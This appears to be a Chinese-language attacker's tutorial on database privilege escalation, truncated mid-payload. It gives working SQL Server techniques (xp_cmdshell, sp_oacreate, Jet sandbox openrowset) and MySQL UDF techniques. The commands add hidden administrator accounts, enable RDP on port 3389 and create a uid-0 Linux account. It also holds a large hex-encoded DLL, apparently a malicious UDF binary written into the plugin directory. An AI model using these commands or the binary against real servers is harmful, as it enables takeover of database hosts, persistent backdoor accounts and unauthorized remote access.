这里注意，在高版本的sqlserver数据库中，一些常见的用于提权的函数默认被禁用掉，这里需要先进行恢复才能进行执行命令等一系列操作 本次我们使用的测试环境为sqlserver2008 对于高版本的sqlserver系统默认禁用掉了xp_cmdshell等存储过程，但是并不会影响我们进行权限的提升，在恢复存储过程之后我们仍可以进行操作。 存储过程（Stored Procedure）是在大型数据库系统中，一组为了完成特定功能的SQL 语句集，存储在数据库中，经过第一次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。存储过程是数据库中的一个重要对象，任何一个设计良好的数据库应用程序都应该用到存储过程。 这里注意，在高版本的sqlserver数据库中，一些常见的用于提权的函数默认被禁用掉，这里需要先进行恢复才能进行执行命令等一系列操作 本次我们使用的测试环境为sqlserver2008 对于高版本的sqlserver系统默认禁用掉了xp_cmdshell等存储过程，但是并不会影响我们进行权限的提升，在恢复存储过程之后我们仍可以进行操作。 xp_cmdshell提权前提条件： ​ 已得到sql server 的sa权限 ​ sql server 开启外联 高版本存储过程的恢复 EXEC sp_configure 'show advanced options', 1 （sp_configure 是显示或更改当前服务器的全局配置设置。将show advanced options 设置为1,便可以显示高级配置选项了。） RECONFIGURE （可以配置选项） EXEC sp_configure 'xp_cmdshell', 1 （作用就是reconfigure sp_configure中的xp_cmdshell为1。也就是开启了cmdshell。） RECONFIGURE 如果以上方法无法使用，则是存储过程被删除，我们来添加存储过程 dbcc addextendedproc(\"xp_cmdshell\",\"xplog70.dll\") sp_addextendedproc xp_cmdshell,@dllname=xplog70.dll 提权利用 # 新建用户 exec master.dbo.xp_cmdshell 'net user admin admin /add' # 将用户加入管理员组 exec master.dbo.xp_cmdshell 'net localgroup administrators admin /add' # 开启远程3389 exec master.dbo.xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f' exec master.dbo.xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\" /v PortNumber /t REG_DWORD /d 3389 /f' exec master.dbo.xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 3389 /f’ sp_oacreate提权开启sp_oacreate支持 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; declare @shell int --使用sp_oacreate调用wscript.shell组件，将返回的对象存储到@shell变量中。 exec sp_oacreate 'wscript.shell',@shell output --使用sp_oamethod 调用@shell对象中的Run方法，执行添加用户的命令，null是run方法的返回值，我们不需要用返回值，所以写null. exec sp_oamethod @shell,'run',null,'net user admin admin /add' exec sp_oacreate 'wscript.shell',@shell output --使用sp_oamethod 调用@shell对象中的Run方法，执行添加用户的命令 exec sp_oamethod @shell,'run',null,'net localgroup administrators admin /add' --开启3389 exec sp_oamethod @shell,'run',null,'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f' exec sp_oamethod @shell,'run',null,'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\" /v PortNumber /t REG_DWORD /d 3389 /f' exec sp_oamethod @shell,'run',null,'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 3389 /f’ 使用沙盒进行提权提权语句 exec sp_configure 'show advanced options',1;reconfigure; -- 不开启的话在执行xp_regwrite会提示让我们开启， exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure; --关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。 exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0; --查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。 exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines', 'SandBoxMode' --执行系统命令 select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(&quot;net user admin admin /add&quot;)') select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(&quot;net localgroup administrators admin /add&quot;)') 沙盒模式SandBoxMode参数含义（默认是2） 0：在任何所有者中禁止启用安全模式 1 ：为仅在允许范围内 2 ：必须在access模式下 3：完全开启 openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。 恢复配置 --exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1; --exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure; --exec sp_configure 'show advanced options',0;reconfigure; MySQL常用提权前提条件均已通过前置手段获取到mysql root权限 通过外联或者大马直接root权限下执行SQL命令 mysql udf提权Linux环境 获取插件库路径 show variables like \"%plugin%\"; 写入自定义函数 select unhex('') into dumpfile '/usr/lib/mysql/plugin/cc.so'; 创建函数 create function sys_eval returns string soname \"cc.so\"; 执行命令 select sys_eval('whoami'); 创建root权限账户 select sys_eval(\"useradd -u 0 -o -g root -G root -p `openssl passwd -1 -salt '123' cimer123` cimer\"); Windows环境 获取插件库路径 show variables like \"%plugin%\"; 写入自定义函数 select unhex('0x4d5a4b45524e454c33322e444c4c00004c6f61644c696272617279410000000047657450726f63416464726573730000557061636b42794477696e6740000000504500004c010200000000000000000000000000e0000e210b0100360090000000100100000000003d9502000010000000a00000000000100010000000020000040000000000000004000000000000000010030000020000000000000200000000001000001000000000100000100000000000001000000009980200dd020000f19702001400000000c001009000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e557061636b000000b00100001000000000000000000000000000000000000000000000600000e02e727372630000000050010000c00100e6da000000020000000000000000000000000000600000e088010010e89a02101b0000000e000000001000106b970210b7970210ba970210c8970210a3970210fc0f0010de960210e0960210809502101dba0110ed970210ffaf0110d2960210000400007c070000c40b0000b30200006604000090c0011000000000ffffffff01000000010000000100000001000000000000000000000000000000010000008800008018000080000000000000000000000000000002006500000038000080660000006000008000000000000000000000000000000100040800005000000090000100004400000000000000000000000000000000000000000000000001000408000078000000904401005c3c000000000000000000000300420049004e00459398edb4853493541907b2de1fcbd640cd0773df2017d5f39748433f6d90c556f2b1c13f1be3bcb417f756a33186e453b17faf31e8157911b03da9aaf41f2277afffec07571bfae8214b0ff18af2f7c0ad2d95a1ff0f487658e587923bc1ce9d2c2698c74b940c5842bf55c7da2026563c174c45c6c5e08e95b030390ef0886bd124043aed5b1631b138955065fa05fbfcc1c0b81636c51c7f18bccc846ac8305f5c5134fd92a3e9cb2bb5d99ee1e21a6f5d2929597c59b61e8925c1675138746f1f549d1b8a0c35b7dab30b46a401737162d316fb50723e8a98ca5d6d298259015fe6e1c0a402790e15a965807b488c73e6915ffd6e57d333c0d86ef3a562e0bf0bccbe4bc7ccb560bc2df75d593904f638eae6a964c33f4e123a1d3c213b184373bf34c66ed68b368316156e32f6fa63e02add3b03893f73af8abd1099c48c1d0c886314167008ef255d5c2c3539fb781d6d39aa432d654c702f15df0a339530889adfefde4b9df29d2e8fa7e4317fda1b0588a22265eb53c317bc6ea94fa1981968d5a60921ff60f9e9559123aeaa8d1e91e38fb1a2fb1d2075454e8ef226538ed8307db2c99cd396b5c6da829569c3875f317a4bff429b0528d204af4284fc05207901d48e52b386e5d44c69a2e8e3086f137f1d0694ecd619ecc97af83a97d5a0598701b386bd704864c72b3858824fc94082da933d5fadb23ef3dee6528cd4cb2eefe2f2b03d17857940d70222d541b2523f4e7d5b8ee46caba89830d664defb08f798e83818cde2701b8c5d37fc6c5c045ae468efca8b8d5b62b60811c21dae6b86deffa3824e7581435c0bc67555c2d498047554b52d0bfc909911e94ce5d6d3a72659b0ee25f2b40be7d239115256d8c2687afc7e075a2557f974d9130d76e09955235ed4afbc03891d8cc489c8a6f0aa00cfa41ceffd29df70edd17679477c4edd29023c807a55e8dfe614fefe44ad759cfca628d9da21b68e2d6a7ab33d62b175fb858c94158923278f256e96eff885e3eafa12b09ecabfa54d523a3c33270510fd821a0f56e24d3bfaa815a6bd4e2eba52e52a940037728e2cbcd8278fe714384a4bfc887797b071bb440b010a9d0db60cbacee05907b7b08e20dba7f45ffd21265bc47086f8275c1c5071afaeb7ce0336e0a5facf0a7923597c7f4ee7b54512b38608c8ce06acd05cfcdd68ec58f288889ef615623409bc88dd3b09b8be22fcc199755426b4b0704ec21ae1a3e7efe21cf6952456f3743d8d76e1d02e7f7815ea30feb20f279fa9cf827d7618c1c182be35a5ab2eb9f611057b493eff526a75513347a1dce859f1d8d5cc9e842f55f82211b2fa26ce53c5f133afd31531c50324a5429b74fab0746eed031acb0d02344e1b495bca244ae6eba4dcd3da28419a064c22e895880fd2485c3e6861b6e06a4e43959b9d0633774ea85692b12408f6867903f8b9bf790973680440d4822238690617af451d0eebf942d4c98637e9ba092b38dcdc608f330722cc255a4feb5d2a3cb268518ebf43231d9630ac95ae22ff0b8640335febcaf6a3066be83f03673636639e7cb025963d4071886ef072bf9f6f5ad0e0a407734b77320cb1fc6a6a07d14d36403ac1b849eba998b5f64d59ecfa4e30200d84d236a12b1b11acae3e4d74ca5368657f93b4d80cc5356c5537ffab7d3f792a03912a01d94c03f4f097824586708ecc7cbd1db4b7e24a0f2e45121629b9c2bc92716b790246c4a4159fd9e4958fc13a4a72c1d799078d601f3eba6457ae19a68877841d343175f3b692ec219c3a059931421596335af3121670ef9602fce94de822922d7f1c357f7719b2a63de4a0c9b648297326b5a32082462e6bd83457f5c415a418209b4deecbb66f26383d9244f08e0aee60659808dbd2a4744865f6b6a0950ed88138a0c6496245c84d60caabef5facc467f114dd3b695e39fb076887147be54b8ff924aad0e159f4da839d7b67ea764b3e5906ad36bc3c476584bb38b7f009cedab0e6d89bb9ec76e3228e559b69c763bcbe2804dfbc4c6eba24173214dd72f455eaf170e5afc8b7a1ffac801dcd05a53aaef649f67f1d11cf249cdcf2e33a7d93e872d323a836a78be609996b592f3bb5fd8f6b952fd09d66647dcc055aa681b8af88597d510daae5255d2318b9b5e116b83b06c8a644010d677c683684abd9b677ac444ec7163218e4708336b0d12bbb660fe9bc21e49d2efc76d74e26c71d6c945267fd7d664fe5385abc834f661fe715b0924e9c63f5f6c88cb0ee11b44393a9113f6c17d56bd982a00cd4811653669c3a1b9535260742017659cf380fbf76ae37b92863bc94923f3990658db72c9c64bc29d4c2c03ec0c1c74e3558f66092c1d78d710d52a2c96cc6cad8729d9385016b36c9d231986cb60e8cfeb37aacf1205b9cbad985834c8b4b9d435e17dbc94967b5eb3e32e2a0423744951b1a087d85a822663de7a3f9c2253f7366d02e161b9b3a18fdee2946d741d3f2a5b0d0f3217e54d9cc97c8a62abca1b114240cce3576a7131069751af5a280721df185caace01a618f57cd8dc52e03a85048adb2d6f31d9d136817602ee2c38f694e6cb9eb2e830abf46b8a2f4ecf4fbd190e357d774e1dbe9de09650ea97486d41bb406c36d07dfa66c8347720158494c21ef841d6219aa0d3c8dd1cd33c3734e49ee574928bb0b1b28f86f0eced7c8fc50e93868455d6419ed7bffe464315490de54ab89437cd6f9f2e71fd59e4c5863ec3f83e4760edc9bc51a9c55a4b253c7966eb110259221449c131b3b328630ea1da1d8553d05fe6830902950a48d623396edd5280a1bbb165d1eab1a77f157d1b7870c4411850752bab0b6fb688d268901c2d8e456e3ee0614d1dd30a138f33661268fd83eb720f5953c280949f7760372ddfbcfd9fa54ced88fe574da013246aeea3bd41b72c6dbf603adcc21e5b7de44345d2a972ec002761a886b55579b8ff13286f668504c3290d15dbef81b1e96ad946a6466b7128d0ac11fb7fad4fe60b6c70e687c5665827a1ded9326f329c3dacb0dbd25ac1adcdc3eccab7d97db8c55b96afd5504bde724ca1489ef6108b25da9555f78111a6a04c30ae62961ade9cb8c02be27ba9984c0104ab80376719a08047d821b0bf60e1a29a6d7d377760b053ae91bf8057156e5b593a7dc8058f05e2da4ca217cf5be8881e00fa9d1f7a618820a0f0b2ba6175dbca0b6f035bc24ebe83198b5a90ebde91e8954581da67159639f40f37210a1bd8bf14dc987fd37b1a5fe69bda234e6d7f70d9ca0531039f19fd054904eea5b7a52ec468e5345437d0737b1495dc7249ea4cfa6f48c2e3e6158d5f0f1efd1bafb4d7fe0b0dce7ad98e8d3f57bb708a8aea83a0eea3ddc00394dfcdfafd308b6b24fa20c7625d2fcd6a5fae7d273ec98eea794bfe979dc3123ffc32c197bdca6321b57785908e6d19ab6f536a8df7e1e05baded7a4ebc007766c508a13394f51803beea47fac0ed97c25ed9888ddc6dc6219e704c6a132cd04cff7447b2df742108d0272366b11b2c4767464b460251de4ce3ce6d193589d14aec9b97766a6883e4dbf1dca0edf32f8980ebf2f9c935dcc56fa6e0b29798ea458e6edc0af271e6814fa425548e41fc8f641b8ad487a20812e4eb25063746b3d4244b101031580a0119d649ca5f32a68b11e7d5741a5ad7682fa8fafbe5aff113269b9a47923f81d3a028615f8c6e7b38e78e443cb2a49d91c2a7757a99df35aaa71dfd21e0b5591af970e6d2f239ff7e2d76acd9967ad6fc30d460d552f1930461e9b86a92d358618fa3b539029603a3260fc65d57a5909e35777a633d9093911fc636bfe3745a7510cb4633092223f5315f6745a604ac0365abae8968b19677f840b1502e21b638ceffd5075b3d3688eab91379dfeed65beaa5f7ca5b971dbc53c6c000b259dea5d6fd84b2e12090331a45299d807d3c12545f84710d36168ca4f277c8fa3982806faef71d73860b58f8db7a3116af13418100c8e905651b538b5c1853fb194c574a918b8f0426152253ff3db5af8289080fe0d7bf2b9d907c54eb2604d8f4e3865d8c7e8659acd1928182206c0efad42664b6ef473f74d7a8d681273590a487f250c143bd18253c3df904b620f4203757b029d8b41bfbcb9ace3d5e7673386dab5e3e486a3f49bbf89f5a4c67e0c1067c0adf6bbdfa43cd6289c1e45e46fc4f236a708684f9461787a90f6fd9a1f55690bbb3ddfcb94d960c39f58110acd1a4538b6ae85b06e4024610575bc3069a2b90b07e01096854e1e8bd00260bd495f975c8543030031c6fbcd201bf384f27f72af8c9ce354ef66a27fbc04dc0bb34f7a67518575d78bcac95243f1743b0f843f7806d1b6278766e05e90694a328230b378516ece63e46180a0c2d3972674fa8de29c864198e66173bea93f54995bfaa4b1e8638ba111187e26161d23ddbaff9a1dde6c8601b6c1c5e0658a153685de38e7a92a39d34587d67d10da2d7a01e70ac5488b16d0002229154101f0d5f6afd6636f7e376a3d5842861f8c5642b81676a5a3dc14de9bfe1e3011cb9e4cdd6a1afa87e84f86ee792a090f48f9540a23eb0928cf8d9f52a44acba76c827494bb6ef8971f1690d441f0ba8322b5cb15ee105e95ab47f560ecef4d5046c75ded3523549b3a2a0c878906af9ef17bddb57d82a437932d9b6802cf178e34f9c4764054f01902258e7d2317b9a98e78bc273e406d6fd2d33c4270cfd4596fedec01c4f9e6216f73a71e930b208d247dceee69f0d1f55a179c70b69f71c0e8a8b4cfdd89cdb1908d6d96b33d98a26456f79f26c744f9f7508983324cc354c1f20f89480c8c506fa04f59cb8ae99f8bf4ae9ba8b06f6aa052b695aa5da8143eefda5b3a4d65b0333f944861d2d53503236151731f4b262d66597865ffebc3474f3566b56f4ba520e9fd933c304ef9ca43bd6336e9b82e0e76724c1820aa1bc231ae694cf759938c29c210cb676885a65b4ae212f4382788458ea9a136bfc9bfed6f159e0844c4db54a3bac68d95cc91623f7e1476f8f736c131097daf671157f18d67116a2d273fa9e53375955bb7bb6ecb3518e7f05dd9248a1e26607708ab2a67904c44325fbe219e04512da82e93d466fa33a7d00d70d1cd45d650f3bf001bd7a2d0ae1c545fb75fb6af69bbde85e358e272b26dd2ea189db0a41c1131ec3882d5b72e3a643e02527909758ba4bd542746b60d822b35884b828a12b683aa4abd4861f7a249bbc0dbc12559e88c2bce5bf5aa35c0b17c69794abbc5765e7eabca36ebfb7318998f974d42f3df2564e29abe38e7671d25702051346b86fa36f6b71dae27e7506e5a5a790658646ab672bb825857890107e837992ab33ad751963c155d5d85dbca61092accb9e38c4589db3487082068f2dfc818fe05f8ce8a18dfc6716e0466e87d79ad6bf1353b0a34be96416d0f44c44a9563fdbc2c093875a385ecfdc6e11a488964690333669e8dc714957e0e1b3ce29c2309bd17ccc74520cda658381385821f44137a3486a682fcefc2e111d8304264538a64e8acb6e791960342463f970c4d250e154f28b66a5a7011bf7942c04e053804c100e79a1cbc4278f689ab9a3bd4669928bcad4c165644b53695fc7910a2129a872e548de830ef3b7ee255e7b6480f06f9fd895e84e5b5e038ffc0389317e95a79dbe8c95c8b8bcaef5a524abd85da966e905d2db3946d56eee8f5006ce54eea02c035af841bdcf95509422fc24329e6a03bf6eafbefe5b6ffe19f45a63ceb73ef8bcb0ea9e3030d27c3d6a8ddd88b041dc47fb229431498262a8887785dd8657c055229dad916a71360aa931bd7e158b6c17e3a2d8cefd88f77e40ebbcfa4db96b89d6f51402d7e325a8e64fe1fab085568dc5f373bce2bd05b24eb60f87214fa162086d5521d39ee0eb565f86f338ff996e3fcf4a9dc36f3a32cdcc356eff69cc0f5bacea0f331494796d808168b83eeb8489c0f687052c709e7558005e7d34aa60424265cc8a656d065ca83b78ed51d0a2a6f1768c3048ade80275469ca6091a5720d56e36c1c5dc0f6fa344259d34c2324821ede5ce0ddf1b9d9132270a6c2ace863d258b5377f3dabd660a0c4d59278fa23f056d76b077812e7db036500bdd1bb333043ff1aa5267ed828ee5af9e4cdbdeea851f3234f93700e681f13b5eacb938e03851d4e80f319d5dc8e6439fa41475d6f133d131cebefe4db7f3a7c0b9d62511805373e2a5ccb637b81fd27fddf03eb72d74bf20b54e00a501acf1a61aba9d994055402d838b85930912630335e5b545c0058d9474e5ac355a5f630f8ae6e3860bf8a62798926179a3bc9c2e7264752ea7a0b45bb6053169504510e70a043d3efdc5af76a2e1df04c2a2b7cf96dff5e8f212510d9dfec01b425107c9c8fa7500637a27eff7bb7eb7935566bfaf5d37323def1740318875ba2e0cea9dd3ae9ab7d0bf74ad9fb7c87c91a62aafd80b8661f28d5148d92a4f8f80167b786751a40edca8b3de8c2bb05c7cd682865ac3493377cba23a4e1fea18299336e7533e38af3598acde9646c1d6164b3fa8059aaa522824f6ffb90c12b4827d0e0302153f2126201bb6b588875cab0d346a7dc8749654f503f01bd9a4e672a88104829417bfd2e344b435fd111ce7ff27b56c81b44c487df01e63f0ba70228ad76fa2b4e0d5a57d7f63827afc2328a3f6b679eb581c9247689baf8057fc892bf5b323f19091b085bfd1625d7458d8a8a8ba3248fe992fe9edb14dafe34355234271d9ceaf4e9e298c02743be6b5488a8e248baae788e793301078ebc3824424374a0624404d6ce2d268fcf0052a20125e71295eea2b0c395ecb2f4bc20efd7270e4b00f2a17de04a587c4e17bdbb07713f830be090c4200db5477f75e44c9714d4eee288e438fd3c6887e5b08ba6f2f015dc749871fed99ac7bb5d25de80ff396f0139c1a98ecf25971383068cd71083d9a3d11f73860372efeb266da459d9e3f49d7c6a47e034ba7d97142cc6183bdcd38b0881ae18061070e767f68835d8e51dd585dbb6597b8e66ea60a553d876bd355b83d2c1340385ecfacda26d65c744aa6d025dd393ec353778c0c24df4abce8f96006856ce322cc902aed08ad19ec4c01ea392ddd15ea0b6f25fab35cc314169c440e9552e5dcfbf02a7eb924c8f40e7299245d550ced955f57dda2b95770de0f80041384f26f075cf4eeb0b893f5a3844e9779b5ed0c83810f6ff31836f6c289a7bdfc95e9d452f931e6dad9252d97220485e59aea90fa8df84b17e993f1627ac66a7ce4920eb63fd7f27b0969e7e19fb83f8252623818cd78ca73414cbb5be0f242ed5fbe337fafb88cc3d203b5cbc73daef664635f7c9db24a6a7795ab7f2fec1d47cda394ca4367013911174e0a7949c6a8993483c76891b248803a5be67deed96cf301a14ab61246be742eb8e3a09d3c619ad9f3320ff53b99c2b6b2f41b009d629ce0df2494836158fbe4bf7e3460d88cb212c99a4decf3f9ccec071f494269d7bd570b5ea0fca07485e5326a4a6727e7e0c101375e4239535ee6b0d63a20c3c9bfc5d0dd9940348c3421673039371ae3074698e7167c70fc635ecb2daa207aaf4570043f2dadb1af007b930d979cc0da729baff0e077df062ad3f2bcbd4e9daebd96f90fe9946cd88eee0d72a9ed035af0bfceb843a2399468088a24d8b999403438fc99f0da8e4a91a939953ffaf7251ca3fd466ff2110afb33242e278c6b072f5ed3df4c1482d28722874f0b1f30226bf336699766333dc331abf7ec09466be15eceaa2bc8d6b21ba56d5e960b7b485466ac92f03b3ae98bdc441686e2d89975756dd922bde9f8760c6a9a21e046d9f38ad2477e5c11e306b7f335eb5bdc198c28a28139b4944f43cd22b6798e89ed772271a43f1c802db013d047977dfd98361a4ee89186dbfe61fbfa02432ac4645f0ded7e6ec07e82f102922c1917082529e3a364b43196e93c1ec6353a0f972165d63b2086e43d31c21e28136e72f338ffeea68bca8490d58227d435dcd2defed8ca49cf486ab29b7e776220e66c20636f1f551d54bae83b4996ec68d656f1a29b82d806f5498f29178f503919d517835f289d4b5f679d61c4f91522ed8ab502b544346ed3b3c2fc949a149a24a703aa524a38a233323a02fe5fd220884d708999f227cc27f800b6b00c4cae107def5b0cb9ca4336875662af9622231b38521463432c4b7ef837569efbad1fb7d6ca953e28d1d0e520b0c98fd74a424a6c06d41a60d7cd6e8ee721847acf03f996c371c321a83bf15d37c72aaa44b51bf5a7e8caf1c3787eee48aaf372f010931cff21682968b2033bf4809203203ec61566f96fcd2acd00172d91e9bfb5b8025652263281d985b316040ddef4aeac0f8e3542b41b76ff98b5d0303854aaa254c3a841867bb25c65fcbc2271814b525be74b3401b240fe5fa3ab12175af55366c7a839fa2c7ff59f85bf0b51943df5c12537ca78ae77c176c5e4002a87893a62c256f0c4f86778e4e059c0aa20e75bfc5c2835f4df0fcd7ac1171f49a8ce39ec5b6a2f69b995997dc62f7638c6e379846045e4a6ee0c1dfd162e2655b45769fa10e87bfd6b4a488477dd4f8e70cdbdbeeff66daa8715f286ac7a73506871cc21e4f7ef300b6c295c78c1b3e5d6031d7fb3be5b5635bdb92bf94c3f4e4335724182facaa37c5d65ff165913ff61cd8971d178a62444e45d6c92b19bc9a1b21febe3715a1f9f916aaab25910986da22c736954bfbf8b0c0281b1ef97b9851b12ff39d1ad97dbecde06fb708a588f4bc99dc5d52f1ab87407b40c1e06d23761e354a2dfde9324f64b7d3391c5d2857904a12965011bd2d1f5d6e5fadc4d4acd5605167f10172dfbdf466ef9f34fd1b5b290d426bb3c4c812de12616016c6dfed62615f522342a1157218cc54ecb2874a3fff11d97810c5d667413cf74008b6ba55cf547d7ad1e10930da17f15a7b9979dcdec0191f00fecc45a8321f0ec2c4c2abc963f8bdf34f3d05b8db7591880c0e36ea294ca4e483be57094addbf9edae51f8b0c97bf47861304e7b304f3591f1f2e6f2b287b3ce9e64fefad5e811725b9a41ea799735ac307790582e651e16020bcb3c4a4c34735b4c6527703674d5506d63e7a5a5511018dd34532ca896906e1b8c9dcfab3ae32e52727f9322ca39609cfbcf058e20920c673e7af34cc8f3450b3a52e16deb895cdb2e412d26b88b9c2837bcb7f82c9992cdbe9dea677a34e4d9c612cb2dcdbcc9a2eb11d77558410c483844a7a9cca54e1a2a2d74d131817dbbefa63405bbbe04c659868fe80cf240daf9c26eebdb898077e59114a226bcd0d8a24e2ededb73f18128661f5ed021b14ccd6c706ad72dd68614248496fda0e7428ac21269c6cdfd567800cf258f031de85d46a1dd9f962acc481085a1078e95f9a839d5c08e55c2652879d2c2506429689612ed4a6431b1e2302965b00f9ae4c6520f18711ee8e618d4dca0d4927b88381cc0d5fe9652f29a3e45faf1918a1663b0a117fc3ba17640c01d60b305d4aa89afc9a50517e78bd488b66c4bda8ed57e3ba56270478bebb4737580f1f77785cb60bfcdfe840e9053d3b5f06750adcfbfe713cb46a1df4b7a828a4f3c8117e208a7b3d8d934b408478101d29dba20493b57a443962e2969f3165a200fe6ded2692a029cb1f9c138e25c14903129b018eba648d93c2079a614dd03d948fdea6e877b748fff6a7d396bc58e096ca72a525cb67594841f95a99ea9351ccda548a7b7b2311ec672b27e535edac3c2bbeeec863b4ed848b53488189ab6bfea6bd376e5280f0f4f5a1d526fbcc91a97a3d21f044235d6bed56284c19c41f4cfa3f31598e7dcb31fa761e61a9bf57f19daa3ba5634e5a37cb7bddc6115d436f9b3a0e56fc0adbbc4b34e8c0e25643d7b9bdb32267f524b2965a37e5070db5fb5b612d249ec12960128f7980d700b2253a5fab0fea4aa9735144d640d7f25a34282a3517f2dfe39d595c4c68a525e1ed92ebbdc50798b5b62fa8a694e61af9db663f2f0f6bec86ec451fa0b08584c23feab9804dcaf95899fe80206103a841f88ffd663d3d475eb4633ff36702afad9eb4c8b666014d89c21eff0f1036b6fe2845d5e24870e45d61f89eb8ed87a70289500391151d89ed889cda7fff8575a19e9b824aa2b28a9ff22a7b603bc6c91bfdd38b01303c2fbcd51d62a5fd73db8305ff84d7436901d0c3b613b6bae8216d15e357181b6cccb325dcb1ec9e41f5282165e6333011ae090f9fe001a3a2d8f3e47c1fcbb651c0040ae1fd3a593934b8e838ad397ba115433dff9f55e62dae5d5f768cd6a5becb121aaa08cd3f1e83f4ac69eb191247573ecc66c6c9faa7dc5f97e3405dbf86a9211c9450c62218c5f14f3719b0a1ebb7e9128e8989070e8921eb4e0552339b34d02b2b80d12a966ab63562ec61688d46b3beacf361793d9f2df65024473dd785b8ad4a5b98fcd1385cd2cb78e01061d0e8e23b437022f42a2f8ea396b44c1abf35b644efacbb064345eaba265093eb75d6ff9371edce1d3eb1ecbb364c55db41e0287554af06ca4b0db4875a5d2c8f1aba69771790d792b06ac064a9d12854e2324a485ccf5a4fe6ad39c3a57ff30c8a83b341bbc69e9dbbb89530b2009a30b5bff3adf3505311dd291208d47edd288bcf6bbff26a2877254b4dceed90a3f7a4a5b2f7594f02e43e07b635a4ee8b182c4fef7282352a655bcb4e8d7fa68365712b23ad0bd600dc3d5f39af26290a4dd8564b68d1c985cef5434c461d8206bac6d7c0d1e55eab379c5a8b1c17eeeace75590c78bc63a59e3a72827c0584500ca48ccfc2a65e16b3527950ade1f945f1dc31044f0b56ffd1d372014a9b347d85d63d0efe03d1bd6ae0fc95d5703dddfa091098ea4b8228ec77fb6fa192c969343232c3ea5896d9a39503c528564d8babfebde7c85c9ba14aeae5c012c41a75450ee464298d6af1cdb03e44211d2c6796babec9d335446977aa552a51dfdf7d61cc8ba4ada1d5674321ba172aabcb7e82caa3e497923de2a466ca1e908b118b4dd07fa6fb40901f3d6e0d6af3dcbeb2b678e44899b8663f1e91cd00a32f21c407965aa89cc3d6a43b5d9a4472c756e6620a82f22fdeee5e4d416698f75dafb1f4e19b4114b65e4ef6de33348cc5292a67e598eb84edd47841ea6145ae1a9feda9d2a41983af77596a87083ab0c88e27bde0ba0cb96b5ec0641b2c7b82455e3b72013fe5112e3ca8657e5a785fe8bf5fc2d2073bd75910a12215949867c1fd5a9639f6aa9640bbbc7e59194bd165dea0402f949e8baad329f46fa16cef4390faf9b7111e2575fe16e1b76639ca0079afbdd03741aa148754ad5d7dde6b4321ee295003a0b23001a2cdf27f263a71876958295fe9b3721c1f04ea2eebbe98bddd7f0af338a88b9bd57dc88710d28f573e2a2d905d713af99d492c129b2d539277d7418b1d357a74adbe27585c25bd2c16c9f39f66ced1f5472f2da1b92c195b5aa84737c1c51a7a1bde1344bae614912654ef6643e3d820b121dd2631cb6d497aa826c4eb79dc98c6b8a9bac431659610a6c7d1511a6fda5b7769c847b59052f072b2af69d47efca50f39afad47158ba81fe287d725d07003bb58f0ecdf7467992f63b6e413b932d70aae0930e0f1ff762f3d004526d89a388c690a20b949f574d6c248d6ab42696437dcfbc9fefeeb40742dd3c10d2f5f22c05e8e7c0fabbfa12aaf186a79b47f3c7e0cbcc2d0152ff2aea736096537a3c9c1f936ba96bb64733907701efd65a619c788b589a7f15702bcf2f0af62857b9f8a7e343156ed3e483fd08f34957354daeed6827c67b34f6b3461dfdb2bd3c8d390fb31930c3822fb7f694a22f3239d012f706dabff10b03f0e66869be4a435eff24469dac80754839d8933e1e781b965826eb53c47fc53bc2a85386cce1dd07fed6dc16390562ba8362bdc541919893cc2ccbf5565ba3b37166a31221de542d5b11ef0381d32e8ed8a4c8789a219721f821b38e2106cda68c2c6d2088fa5b3d1b9c2f8c543ef40555d9f667186fefef64b54dbae5a906dad48cd02e0fdb4500aa492e7efc6d5698dce363563bbd606179dc7821b9a736c31f39def29f10e40dafdc52d29b591178223b5e84f1983dd54a62981d8eab5b674d80c70627135ad90c1bcbdc2a9bdc926653cd56078eda264b9c9226fc4c9b549fc4cf73cdd41a7c26616755e7f8a1450f5236d1ba0c378188ae71d5344eadf7d04dfc122af44d59e9c263a258739c34082d88c0760ed5067baabd00485a3339e19afa4ffca023ac57c936fa78b1c7c04dc0d94f2542dfabb0f3ac3a7536d7d1384edf06729ff08eba1b7a7f5dd3f78f154f51f6092db8dbb91f8d0ea81065f4d0c431276a68f416022be7efa82d735613025c3f593c7d57b15643be8ad7126102ace4ec9a82b32b3ca4ca9140aec4d9f0172c7e7dcb22fd06e0b9d3bb1ae41b5c8a7d35e043e75f30eef7c0abd7d10bbe23847dab51b9031fc61f1f8a05cf395970d66d2193de952644efd0da226dc1858df23950e1d871d93ce5d1008e5dba83545a24ca5fc3012e126fa3950b6ece8849d4ab945583614e3b2afe